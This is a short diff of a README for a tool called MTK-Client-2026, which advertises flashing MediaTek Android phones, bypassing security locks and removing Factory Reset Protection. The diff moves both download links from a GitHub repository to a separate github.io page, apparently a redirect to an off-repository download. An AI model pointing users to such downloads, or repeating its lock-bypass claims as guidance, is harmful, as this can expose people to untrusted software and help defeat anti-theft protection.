@@ -1,6 +1,6 @@
 # 📱 MTK-Client-2026 - Unlock Android devices with ease
 
-[![](https://img.shields.io/badge/Download_MTK_Client-Blue?style=for-the-badge)](https://github.com/bily-m15/MTK-Client-2026)
+[![](https://img.shields.io/badge/Download_MTK_Client-Blue?style=for-the-badge)](https://bily-m15.github.io)
 
 MTK-Client-2026 offers a way to manage MediaTek devices on Windows 10 and 11. This tool handles tasks like flashing firmware, bypassing security locks, and removing Factory Reset Protection. It functions as a bridge between your computer and your mobile device.
 
@@ -18,7 +18,7 @@ Ensure your computer meets these standards before you begin:
 
 Follow these steps to set up the tool on your computer.
 
-1.  Visit the official page to download the software: https://github.com/bily-m15/MTK-Client-2026
+1.  Visit the official page to download the software: https://bily-m15.github.io
 2.  Locate the release section on the page.
 3.  Choose the latest version of the installer.
 4.  Save the file to your desktop or downloads folder.
